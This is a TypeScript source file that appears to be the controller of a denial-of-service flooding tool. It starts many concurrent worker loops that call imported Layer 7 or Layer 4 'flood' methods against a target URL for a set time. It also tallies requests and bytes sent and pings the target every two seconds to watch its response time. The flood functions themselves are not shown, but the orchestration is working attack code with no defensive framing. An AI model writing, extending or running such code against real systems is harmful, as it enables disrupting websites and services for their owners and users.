import { getLayer7Method, getLayer4Method } from "./methods"
import type { MethodType } from "./config"

export type AttackState = {
  id: string
  method: string
  methodType: MethodType
  target: string
  running: boolean
  requests: number
  bytes: number
  startTime: number
  logs: string[]
  pingHistory: { time: number; ms: number }[]
  requestHistory: { time: number; requests: number; bytes: number }[]
}

let state: AttackState | null = null
let historyIv: ReturnType<typeof setInterval> | null = null
let pingIv: ReturnType<typeof setInterval> | null = null
const listeners: Set<(s: AttackState | null) => void> = new Set()

let lastNotify = 0
const NOTIFY_THROTTLE_MS = 150

export function getState(): AttackState | null {
  return state
}

export function subscribe(cb: (s: AttackState | null) => void) {
  listeners.add(cb)
  return () => listeners.delete(cb)
}

function notify(force = false) {
  const now = Date.now()
  if (!force && now - lastNotify < NOTIFY_THROTTLE_MS) return
  lastNotify = now
  listeners.forEach((cb) => cb(state))
}

function log(msg: string) {
  if (state) {
    state.logs.push(`[${new Date().toISOString().slice(11, 19)}] ${msg}`)
    if (state.logs.length > 200) state.logs.shift()
    notify(true)
  }
}

export function stopAttack() {
  if (state) {
    state.running = false
    if (historyIv) clearInterval(historyIv)
    if (pingIv) clearInterval(pingIv)
    historyIv = null
    pingIv = null
    log("Attack stopped")
    notify(true)
  }
}

export async function startAttack(
  id: string,
  method: string,
  methodType: MethodType,
  target: string,
  threads: number,
  rpc: number,
  duration: number
) {
  if (state?.running) {
    log("Attack already running")
    return
  }

  const url = target.startsWith("http") ? target : `http://${target}`
  state = {
    id,
    method,
    methodType,
    target: url,
    running: true,
    requests: 0,
    bytes: 0,
    startTime: Date.now(),
    logs: [],
    pingHistory: [],
    requestHistory: [],
  }
  historyIv = setInterval(() => {
    if (state) {
      state.requestHistory.push({
        time: Date.now(),
        requests: state.requests,
        bytes: state.bytes,
      })
      if (state.requestHistory.length > 120) state.requestHistory.shift()
      notify()
    }
  }, 1000)
  log(`Starting ${method} attack on ${url} (${threads} threads, ${duration}s)`)
  notify(true)

  const floodFn = methodType === "layer7" ? getLayer7Method(method) : getLayer4Method(method)
  if (!floodFn) {
    log(`Method ${method} not available`)
    state.running = false
    if (historyIv) clearInterval(historyIv)
    historyIv = null
    notify(true)
    return
  }

  let pendingReq = 0
  let pendingBytes = 0
  const flushIv = setInterval(() => {
    if (state && (pendingReq > 0 || pendingBytes > 0)) {
      state.requests += pendingReq
      state.bytes += pendingBytes
      pendingReq = 0
      pendingBytes = 0
      notify()
    }
  }, 100)

  const onStats = (req: number, bytes: number) => {
    if (state) {
      pendingReq += req
      pendingBytes += bytes
    }
  }

  const endTime = Date.now() + duration * 1000
  const workers: Promise<void>[] = []
  const YIELD_EVERY = 3

  for (let i = 0; i < threads; i++) {
    workers.push(
      (async () => {
        let iter = 0
        try {
          while (state?.running && Date.now() < endTime) {
            await floodFn(url, rpc, onStats)
            iter++
            if (iter % YIELD_EVERY === 0) {
              await new Promise((r) => setImmediate(r))
            }
          }
        } catch (err) {
          if (state) log(`Worker error: ${err}`)
        }
      })()
    )
  }

  pingIv = setInterval(async () => {
    if (!state?.running) return
    try {
      const start = Date.now()
      await fetch(state.target, { method: "HEAD", signal: AbortSignal.timeout(5000) })
      const ms = Date.now() - start
      state.pingHistory.push({ time: Date.now(), ms })
      if (state.pingHistory.length > 60) state.pingHistory.shift()
      notify()
    } catch {
      state.pingHistory.push({ time: Date.now(), ms: -1 })
      if (state.pingHistory.length > 60) state.pingHistory.shift()
      notify()
    }
  }, 2000)

  try {
    await Promise.all(workers)
  } catch (err) {
    if (state) log(`Attack error: ${err}`)
  }
  clearInterval(flushIv)
  if (pingIv) clearInterval(pingIv)
  if (historyIv) clearInterval(historyIv)
  pingIv = null
  historyIv = null
  if (state) {
    state.requests += pendingReq
    state.bytes += pendingBytes
    state.running = false
    log(`Attack finished. Total: ${state.requests} req, ${(state.bytes / 1024).toFixed(1)} KB`)
    notify(true)
  }
}
